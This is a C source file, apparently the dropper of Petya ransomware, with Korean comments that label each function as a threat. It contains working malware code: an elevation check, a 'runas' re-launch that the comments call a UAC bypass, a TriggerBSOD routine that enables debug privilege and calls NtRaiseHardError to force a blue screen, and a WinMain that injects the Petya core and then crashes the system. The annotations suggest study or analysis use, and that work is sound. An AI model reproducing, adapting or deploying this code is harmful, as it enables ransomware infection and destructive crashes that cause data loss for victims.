#include <Windows.h>
#include "misc.h"

#include <stdio.h>
#include <time.h>

// [IsElevated 함수]
// 현재 프로세스가 관리자 권한(Elevated Privileges)을 가지고 있는지 확인하는 함수
// 관리자 권한이 필요한 작업(파일 시스템 변경, BSOD 트리거 등)을 실행하기 전 확인.
// 위협: 관리자 권한이 있는 경우, 시스템 전반에 걸쳐 악성 코드를 실행할 수 있음.
BOOL 
IsElevated()
{
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;
	if ( OpenProcessToken( GetCurrentProcess(), TOKEN_QUERY, &hToken ) )
	{
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof( TOKEN_ELEVATION );
		if ( GetTokenInformation( hToken, TokenElevation, &Elevation, sizeof( Elevation ), &cbSize ) )
			fRet = Elevation.TokenIsElevated;

	}
	if ( hToken )
		CloseHandle( hToken );

	return fRet;
}

// [TriggerBSOD 함수]
// 블루스크린(BSOD)을 강제로 발생시키는 함수
// BSOD는 시스템 복구를 어렵게 만들고 혼란을 야기.
// 위협: BSOD 발생 후 시스템을 비정상적으로 종료하여 데이터를 손상시킬 가능성이 있음.
VOID
TriggerBSOD()
{
    // ntdll.dll 로드: Windows NT 커널과 관련된 함수가 정의된 시스템 라이브러리.
    HMODULE ntdll = LoadLibraryA("ntdll");

    // RtlAdjustPrivilege 함수와 NtRaiseHardError 함수의 주소를 동적으로 가져옴.
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    // 두 함수의 주소가 유효한지 확인.
    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL)
    {
        BOOLEAN tmp1; 
        DWORD tmp2;

        // [RtlAdjustPrivilege 함수 호출]
        // 관리자 계정이 아닌 경우에도 디버그 권한(Privilege 19)을 활성화함.
        // 디버그 권한 활성화는 시스템 작업의 제한을 우회하는 데 사용.
        // 매개변수:
        // - 첫 번째: 권한 식별자 (19는 디버그 권한)
        // - 두 번째: 권한 활성화 여부 (1은 활성화)
        // - 세 번째: 현재 쓰레드 컨텍스트 (0은 기본값)
        // - 네 번째: 성공 여부가 저장될 위치
        ((VOID(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);

        // [NtRaiseHardError 함수 호출]
        // 강제 오류를 트리거하여 블루스크린을 발생시킴.
        // 매개변수:
        // - 첫 번째: 오류 코드 (0xc0000350은 강제 종료 코드)
        // - 나머지 매개변수: 오류와 관련된 추가 정보를 제공하지만, 이 코드에서는 기본값을 사용.
        // - 다섯 번째: 시스템의 행동을 결정 (6은 강제 종료 및 블루스크린).
        // - 여섯 번째: 결과 값이 저장될 변수.
        ((VOID(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000350, 0, 0, 0, 6, &tmp2);
    }
}

// [UACElevation 함수]
// 사용자 계정 컨트롤(UAC)을 우회하여 관리자 권한을 얻는 함수
// 관리자 권한이 없으면 현재 실행 파일을 관리자 권한으로 다시 실행.
// 위협: UAC 우회를 통해 사용자 확인 없이 시스템 수준 권한을 확보.
BOOL
UACElevation()
{
    CHAR Path[1024];
    // 현재 실행 중인 프로세스의 파일 경로를 가져옴.
    GetModuleFileName(0, Path, 1024);

    // IsElevated 함수를 호출하여 현재 프로세스가 관리자 권한을 가지고 있는지 확인.
    if (!IsElevated())
    {
        // [관리자 권한 실행 시도]
        // 관리자 권한으로 실행하기 위한 SHELLEXECUTEINFO 구조체를 초기화.
        SHELLEXECUTEINFO ShellInfo;
        memset(&ShellInfo, 0, sizeof(SHELLEXECUTEINFOA));

        ShellInfo.cbSize = sizeof(SHELLEXECUTEINFOA); // 구조체 크기 설정.
        ShellInfo.lpFile = Path; // 현재 실행 파일 경로.
        ShellInfo.lpVerb = "runas"; // 관리자 권한으로 실행을 지정.

        // ShellExecuteEx 호출로 관리자 권한 실행 시도.
        // 실행에 실패하면 FALSE를 반환.
        if (!ShellExecuteEx(&ShellInfo))
            return FALSE;
    }
    else
        // 이미 관리자 권한 상태인 경우 TRUE 반환.
        return TRUE;
}
// [WinMain 함수]
// 프로그램의 진입점. Dropper의 주요 로직이 여기에 포함됨.
// 1. UAC 우회 시도
// 2. Petya 멀웨어 코어를 주입
// 3. BSOD를 트리거하여 시스템 종료
DWORD
WINAPI
WinMain()
{
	// 관리자 권한 확보
	if ( UACElevation() )
	{
		InjectPetyaCore(); // Petya의 코어 악성 코드 주입
		Sleep( 500 ); // 짧은 대기 시간
		TriggerBSOD(); // 시스템을 BSOD로 종료
	}
	else
		ExitProcess( 0 ); // 관리자 권한 획득 실패 시 종료

	return TRUE;
}
